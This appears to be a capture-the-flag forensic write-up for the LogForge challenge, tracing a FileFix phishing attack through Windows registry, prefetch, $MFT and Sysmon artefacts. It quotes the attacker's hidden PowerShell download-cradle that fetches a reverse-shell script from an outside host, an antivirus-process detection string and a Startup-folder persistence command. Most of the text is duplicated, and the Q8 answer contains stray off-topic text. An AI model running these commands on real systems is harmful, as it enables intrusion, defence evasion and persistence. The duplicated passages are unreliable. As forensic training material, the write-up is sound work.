# LogForge


Short Writeup for LogForge SherLock

**Q1: When was the user's last successful login to the system?**

U can check in SAM it's will contain a columms Last login time about Users user: -> 2025-08-11 06:46:52

**Q2: When did the victim last open the browser they regularly used on the system?**

It's a chrome browser but u need to check inside folder prefetch, prefetch contains approximately 3 or 4 chrome.exe process had ran in the system, so u need to focus about the word "regularly" in question to choose the process chrome.exe with the run count highest so that u can export the timestamp: -> 2025-08-11 07:12:17

**Q3: The user accessed a malicious website as a result of phishing attempt. What is the URL?**

Check in history database of chrome in the path "C:\Users\user\AppData\Local\Google\Chrome\UserData\Default\History"

u will find the url the phishing website in url's table. -> https://cool-bunny-55393d.netlify.app/

**Q4: After the user visited the website, they were directed to copy a command from the website and enter it into the File Explorer search bar. Shortly after, strange behavior was noticed. What is the full URL that installed the reverse shell on the victim's device?**

This is the new technique about windows search bars in File System Windows, u need to explore more about "File explore search bars artifacts" to find the technique of this, and artifact of this context is TypePaths sub key in registry:

-> http://192.168.26.128:8000/rev.ps1, with full path is: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString(''http://192.168.26.128:8000/rev.ps1'')'" #                     chrome.exe --update --fix --hash="1e693edc-bcc1-4503-b898-7c0b2899d03c"  11/08/2025 07:12:48

**Q5: This attack preys on non-technical users by luring them into traps and manipulating them into unknowingly executing commands on the system. Based on the analysis of the previously identified command, what is this type of attack called?**

Googling of the technique to File Explore search bars -> FileFix

**Q6: After the attack, the user noticed that Notepad had opened with a message left by the attacker. What is the email address of the attacker?**

Explore about the RESIDENT DATA in NTFS file system of $MFT file, it's will contains the contact to the attacker through README.txt file <-> ransomware text of attacker 

-> email: 0xSh3rl0cK@protonmail.com

**Q7: The attacker downloaded malware to infect the victim's device. What is the full path of the malicious malware file?**

Trace log of file Microsoft-Windows-Sysmon Operational event id 11 -> create file or overwrite to the file -> u will find the executable file in suspicios folder

or u can check all prefetch file in tools timelineExplore it will content a malicious file in suspicious folder TEMP:

-> C:\Windows\Temp\WindowsUpdate.exe

**Q8: What is the product name of this malicious file?**Short Writeup for LogForge SherLock

Q1: When was the user's last successful login to the system?

U can check in SAM it's will contain a columms Last login time about Users user: -> 2025-08-11 06:46:52

Q2: When did the victim last open the browser they regularly used on the system?

It's a chrome browser but u need to check inside folder prefetch, prefetch contains approximately 3 or 4 chrome.exe process had ran in the system, so u need to focus about the word "regularly" in question to choose the process chrome.exe with the run count highest so that u can export the timestamp: -> 2025-08-11 07:12:17

Q3: The user accessed a malicious website as a result of phishing attempt. What is the URL?

Check in history database of chrome in the path "C:\Users\user\AppData\Local\Google\Chrome\UserData\Default\History"

u will find the url the phishing website in url's table. -> https://cool-bunny-55393d.netlify.app/

Q4: After the user visited the website, they were directed to copy a command from the website and enter it into the File Explorer search bar. Shortly after, strange behavior was noticed. What is the full URL that installed the reverse shell on the victim's device?

This is the new technique about windows search bars in File System Windows, u need to explore more about "File explore search bars artifacts" to find the technique of this, and artifact of this context is TypePaths sub key in registry:

-> http://192.168.26.128:8000/rev.ps1, with full path is: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString(''http://192.168.26.128:8000/rev.ps1'')'" #                     chrome.exe --update --fix --hash="1e693edc-bcc1-4503-b898-7c0b2899d03c"  11/08/2025 07:12:48

Q5: This attack preys on non-technical users by luring them into traps and manipulating them into unknowingly executing commands on the system. Based on the analysis of the previously identified command, what is this type of attack called?

Googling of the technique to File Explore search bars -> FileFix

Q6: After the attack, the user noticed that Notepad had opened with a message left by the attacker. What is the email address of the attacker?

Explore about the RESIDENT DATA in NTFS file system of $MFT file, it's will contains the contact to the attacker through README.txt file <-> ransomware text of attacker 

-> email: 0xSh3rl0cK@protonmail.com

Q7: The attacker downloaded malware to infect the victim's device. What is the full path of the malicious malware file?

Trace log of file Microsoft-Windows-Sysmon Operational event id 11 -> create file or overwrite to the file -> u will find the executable file in suspicios folder

or u can check all prefetch file in tools timelineExplore it will content a malicious file in suspicious folder TEMP:

-> C:\Windows\Temp\WindowsUpdate.exe

**Q8: What is the product name of this malicious file?**

In the log have the malicious file u will find the productname under the path of the file 

-> Virtuos: is the brand or product name for several well-known technologies across different industries, knowing which specific one you are looking for will get you the most accurate information.

**Q9: The malware created several directories on the system. Under which path were these files created?**

In some log of malicious file u will saw the malicious file have some file like: InterestedHobbies, ChancellorFuneral

-> C:\Windows\

**Q10: A script file was staged on the machine by the malware. What is the full command used to achieve this?**

In the Microsoft Windows Sysmon Operational and event log 1 <-> the create process, u find the word "cmd.exe" -> u will find attacker perform one command use to copy a file cricket to cricket.bat and start executing file cricket.bat, it have been write into log.

-> "C:\Windows\System32\cmd.exe" /c copy Cricket Cricket.bat & Cricket.bat

**Q11: What is the full path of the staged script file?**
Check inside file csv of MFT to find 

-> C:\Users\user\AppData\Local\Temp\Cricket.bat

**Q12: The attacker dropped an automation utility on the system with a legacy file format. What is the full path of this newly dropped file?**

when i starting trace log i often see a file with some description under with the word like "autoit, autoit v3 script", so i think this file is the automation utility in the file system, because all folder of malicious have been deleted in artifact i have.

-> C:\Users\user\AppData\Local\Temp\316094\Intranet.pif

**Q13: What is the name and version of the utility?**

Check the description to figure out the version and filename

-> AutoIt 3.3.14.3 


**Q14: Using this utility, the attacker dropped another script on the system. What is the name of this script?**

When trace log about the utility file auto script u will find the log execute another file jave script with the mitre ID: T1059.007 -> tactic executable javascript, and when you trace continue with the word ".js" you will find the technique persistence by the internetshortcut by that java script file 

-> Virtuoso.js

**Q15: In order to evade defenses for unattended access, the malware executed commands to look for EDR and antivirus presence on the system. What is the full command line of the second command used to achieve this?**

This is the technique attacker often use to check the anti virus features of Microsoft Windows or the Windows Security is able or disable -> to guarantee that features is not able, then attacker can performative to do the persistence in system. When i googling about this, i found attacker often use the command "findstr" in cmd to do this action:

-> findstr -I "avastui avgui bdservicehost nswscsvc sophoshealth" -> list all features need to check in the system:

avastui		Avast Antivirus UI
avgui		AVG Antivirus UI
bdservicehost	Bitdefender service process
nswscsvc	Norton Security / Norton WSC service
sophoshealth	Sophos Health service


**Q16: What is the full command used to set up persistence on the system?**

find when u figure out the file java script, this persistence is guarantee attacker always can access to this system when victim open the file url:

-> `cmd /k echo [InternetShortcut] > "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & echo URL="C:\Users\user\AppData\Local\Immersive Creations Co\Virtuoso.js" >> "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & exit`














In the log have the malicious file u will find the productname under the path of the file 

-> Virtuos: is the brand or product name for several well-known technologies across different industries, knowing which specific one you are looking for will get you the most accurate information.

Q9: The malware created several directories on the system. Under which path were these files created?

In some log of malicious file u will saw the malicious file have some file like: InterestedHobbies, ChancellorFuneral

-> C:\Windows\

Q10: A script file was staged on the machine by the malware. What is the full command used to achieve this?

In the Microsoft Windows Sysmon Operational and event log 1 <-> the create process, u find the word "cmd.exe" -> u will find attacker perform one command use to copy a file cricket to cricket.bat and start executing file cricket.bat, it have been write into log.

-> "C:\Windows\System32\cmd.exe" /c copy Cricket Cricket.bat & Cricket.bat

Q11: What is the full path of the staged script file?

Check inside file csv of MFT to find 

-> C:\Users\user\AppData\Local\Temp\Cricket.bat

Q12: The attacker dropped an automation utility on the system with a legacy file format. What is the full path of this newly dropped file?

when i starting trace log i often see a file with some description under with the word like "autoit, autoit v3 script", so i think this file is the automation utility in the file system, because all folder of malicious have been deleted in artifact i have.

-> C:\Users\user\AppData\Local\Temp\316094\Intranet.pif

Q13: What is the name and version of the utility?

Check the description to figure out the version and filename

-> AutoIt 3.3.14.3 


Q14: Using this utility, the attacker dropped another script on the system. What is the name of this script?

When trace log about the utility file auto script u will find the log execute another file jave script with the mitre ID: T1059.007 -> tactic executable javascript, and when you trace continue with the word ".js" you will find the technique persistence by the internetshortcut by that java script file 

-> Virtuoso.js

Q15: In order to evade defenses for unattended access, the malware executed commands to look for EDR and antivirus presence on the system. What is the full command line of the second command used to achieve this?

This is the technique attacker often use to check the anti virus features of Microsoft Windows or the Windows Security is able or disable -> to guarantee that features is not able, then attacker can performative to do the persistence in system. When i googling about this, i found attacker often use the command "findstr" in cmd to do this action:

-> findstr -I "avastui avgui bdservicehost nswscsvc sophoshealth" -> list all features need to check in the system:

avastui		Avast Antivirus UI
avgui		AVG Antivirus UI
bdservicehost	Bitdefender service process
nswscsvc	Norton Security / Norton WSC service
sophoshealth	Sophos Health service


Q16: What is the full command used to set up persistence on the system?

find when u figure out the file java script, this persistence is guarantee attacker always can access to this system when victim open the file url:

-> cmd /k echo [InternetShortcut] > "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & echo URL="C:\Users\user\AppData\Local\Immersive Creations Co\Virtuoso.js" >> "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virtuoso.url" & exit












